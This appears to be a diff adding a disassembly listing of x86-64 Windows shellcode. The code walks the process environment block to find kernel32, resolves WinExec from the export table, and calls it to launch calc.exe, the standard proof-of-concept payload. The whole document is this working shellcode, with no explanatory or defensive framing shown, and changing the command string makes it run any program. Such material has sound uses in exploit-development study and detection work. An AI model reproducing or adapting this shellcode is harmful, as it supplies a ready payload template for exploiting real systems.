@@ -1,0 +1,74 @@
+ 0:   48 83 ec 28             sub    $0x28,%rsp
+   4:   48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
+   8:   48 31 c9                xor    %rcx,%rcx
+   b:   65 48 8b 41 60          mov    %gs:0x60(%rcx),%rax
+  10:   48 8b 40 18             mov    0x18(%rax),%rax
+  14:   48 8b 70 10             mov    0x10(%rax),%rsi
+  18:   48 8b 36                mov    (%rsi),%rsi
+  1b:   48 8b 36                mov    (%rsi),%rsi
+  1e:   48 8b 5e 30             mov    0x30(%rsi),%rbx
+  22:   49 89 d8                mov    %rbx,%r8
+  25:   8b 5b 3c                mov    0x3c(%rbx),%ebx
+  28:   4c 01 c3                add    %r8,%rbx
+  2b:   8b 93 88 00 00 00       mov    0x88(%rbx),%edx
+  31:   4c 01 c2                add    %r8,%rdx
+  34:   44 8b 52 14             mov    0x14(%rdx),%r10d
+  38:   4d 31 db                xor    %r11,%r11
+  3b:   44 8b 5a 20             mov    0x20(%rdx),%r11d
+  3f:   4d 01 c3                add    %r8,%r11
+  42:   4c 89 d1                mov    %r10,%rcx
+  45:   48 b8 57 69 6e 45 78    movabs $0x636578456e6957,%rax
+  4c:   65 63 00
+  4f:   50                      push   %rax
+  50:   48 89 e0                mov    %rsp,%rax
+  53:   48 83 c4 08             add    $0x8,%rsp
+  57:   eb 00                   jmp    59 <kernel32findfunction>
+
+0000000000000059 <kernel32findfunction>:
+  59:   67 e3 1a                jecxz  76 <FunctionNameNotFound>
+  5c:   31 db                   xor    %ebx,%ebx
+  5e:   41 8b 5c 8b 04          mov    0x4(%r11,%rcx,4),%ebx
+  63:   4c 01 c3                add    %r8,%rbx
+  66:   48 ff c9                dec    %rcx
+  69:   4c 8b 08                mov    (%rax),%r9
+  6c:   4c 39 0b                cmp    %r9,(%rbx)
+  6f:   74 02                   je     73 <FunctionNameFound>
+  71:   75 e6                   jne    59 <kernel32findfunction>
+
+0000000000000073 <FunctionNameFound>:
+  73:   51                      push   %rcx
+  74:   eb 01                   jmp    77 <OrdinalLookupSetup>
+
+0000000000000076 <FunctionNameNotFound>:
+  76:   cc                      int3
+
+0000000000000077 <OrdinalLookupSetup>:
+  77:   41 5f                   pop    %r15
+  79:   78 00                   js     7b <OrdinalLookup>
+
+000000000000007b <OrdinalLookup>:
+  7b:   4c 89 f9                mov    %r15,%rcx
+  7e:   4d 31 db                xor    %r11,%r11
+  81:   44 8b 5a 24             mov    0x24(%rdx),%r11d
+  85:   4d 01 c3                add    %r8,%r11
+  88:   48 ff c1                inc    %rcx
+  8b:   66 45 8b 2c 4b          mov    (%r11,%rcx,2),%r13w
+  90:   4d 31 db                xor    %r11,%r11
+  93:   44 8b 5a 1c             mov    0x1c(%rdx),%r11d
+  97:   4d 01 c3                add    %r8,%r11
+  9a:   43 8b 44 ab 04          mov    0x4(%r11,%r13,4),%eax
+  9f:   4c 01 c0                add    %r8,%rax
+  a2:   50                      push   %rax
+  a3:   78 00                   js     a5 <executeit>
+
+00000000000000a5 <executeit>:
+  a5:   41 5f                   pop    %r15
+  a7:   b8 00 00 00 00          mov    $0x0,%eax
+  ac:   50                      push   %rax
+  ad:   48 b8 63 61 6c 63 2e    movabs $0x6578652e636c6163,%rax
+  b4:   65 78 65
+  b7:   50                      push   %rax
+  b8:   48 89 e1                mov    %rsp,%rcx
+  bb:   ba 01 00 00 00          mov    $0x1,%edx
+  c0:   48 83 ec 30             sub    $0x30,%rsp
+  c4:   41 ff d7                call   *%r15
